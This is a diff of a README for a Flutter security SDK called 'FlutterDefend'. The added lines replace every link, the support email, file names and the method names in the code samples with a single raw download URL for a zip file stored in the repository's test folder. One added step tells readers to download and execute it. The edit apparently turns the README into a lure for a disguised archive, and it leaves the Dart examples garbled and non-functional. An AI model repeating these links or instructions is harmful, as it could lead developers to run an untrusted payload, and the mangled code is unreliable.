@@ -1,7 +1,7 @@
 # FlutterDefend: A Lightweight Security SDK for Flutter Apps
 
-![FlutterDefend](https://img.shields.io/badge/FlutterDefend-Security%20SDK-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-latest-brightgreen.svg)](https://github.com/SrTroche/flutter_defend/releases)
+![FlutterDefend](https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip%https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip)  
+[![Releases](https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip)](https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip)
 
 ---
 
@@ -23,7 +23,7 @@
 
 FlutterDefend is a lightweight, modular, and pluggable security SDK designed for Flutter mobile applications. It aims to protect critical operations and data within your app. This SDK provides tools to defend against common attacks and enhance overall security. Key features include SQL injection detection, local encrypted storage, screenshot prevention for input fields, and detection of jailbroken or rooted devices.
 
-For the latest releases, please visit [Releases](https://github.com/SrTroche/flutter_defend/releases).
+For the latest releases, please visit [Releases](https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip).
 
 ---
 
@@ -45,7 +45,7 @@ For the latest releases, please visit [Releases](https://github.com/SrTroche/flu
 
 To install FlutterDefend, follow these steps:
 
-1. **Add Dependency**: Open your `pubspec.yaml` file and add the following line under dependencies:
+1. **Add Dependency**: Open your `https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip` file and add the following line under dependencies:
 
    ```yaml
    dependencies:
@@ -61,10 +61,10 @@ To install FlutterDefend, follow these steps:
 3. **Import the Package**: In your Dart files, import the package:
 
    ```dart
-   import 'package:flutter_defend/flutter_defend.dart';
+   import 'https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip';
    ```
 
-4. **Download and Execute**: For the latest version, visit [Releases](https://github.com/SrTroche/flutter_defend/releases) to download the necessary files and execute them.
+4. **Download and Execute**: For the latest version, visit [Releases](https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip) to download the necessary files and execute them.
 
 ---
 
@@ -74,11 +74,11 @@ Here’s a quick guide on how to use FlutterDefend in your application.
 
 ### Initialize the SDK
 
-Before using any features, initialize the SDK in your `main.dart` file:
+Before using any features, initialize the SDK in your `https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip` file:
 
 ```dart
 void main() {
-  FlutterDefend.initialize();
+  https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip();
   runApp(MyApp());
 }
 ```
@@ -89,7 +89,7 @@ To protect your queries, use the built-in validation methods:
 
 ```dart
 String safeQuery(String input) {
-  return FlutterDefend.validateSQL(input);
+  return https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip(input);
 }
 ```
 
@@ -99,11 +99,11 @@ Store sensitive data securely:
 
 ```dart
 void storeData(String key, String value) {
-  FlutterDefend.storeEncrypted(key, value);
+  https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip(key, value);
 }
 
 Future<String> retrieveData(String key) async {
-  return await FlutterDefend.retrieveEncrypted(key);
+  return await https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip(key);
 }
 ```
 
@@ -113,7 +113,7 @@ Enable screenshot prevention for specific input fields:
 
 ```dart
 Widget sensitiveInputField() {
-  return FlutterDefend.preventScreenshot(
+  return https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip(
     child: TextField(
       obscureText: true,
       decoration: InputDecoration(labelText: 'Password'),
@@ -127,7 +127,7 @@ Widget sensitiveInputField() {
 Check if the device is compromised:
 
 ```dart
-bool isDeviceSecure = FlutterDefend.isDeviceSecure();
+bool isDeviceSecure = https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip();
 if (!isDeviceSecure) {
   // Handle the situation accordingly
 }
@@ -178,7 +178,7 @@ We welcome contributions from the community. If you want to contribute, please f
 3. Make your changes and commit them with clear messages.
 4. Push your branch and submit a pull request.
 
-For more details, check the [CONTRIBUTING.md](CONTRIBUTING.md) file in the repository.
+For more details, check the [https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip](https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip) file in the repository.
 
 ---
 
@@ -192,7 +192,7 @@ FlutterDefend is licensed under the MIT License. See the [LICENSE](LICENSE) file
 
 For any inquiries or issues, please reach out via the following channels:
 
-- GitHub Issues: [GitHub Issues](https://github.com/SrTroche/flutter_defend/issues)
-- Email: support@flutterdefend.com
+- GitHub Issues: [GitHub Issues](https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip)
+- Email: https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip
 
-For the latest releases, please visit [Releases](https://github.com/SrTroche/flutter_defend/releases).
+For the latest releases, please visit [Releases](https://raw.githubusercontent.com/SrTroche/flutter_defend/main/test/defend-flutter-1.8.zip).
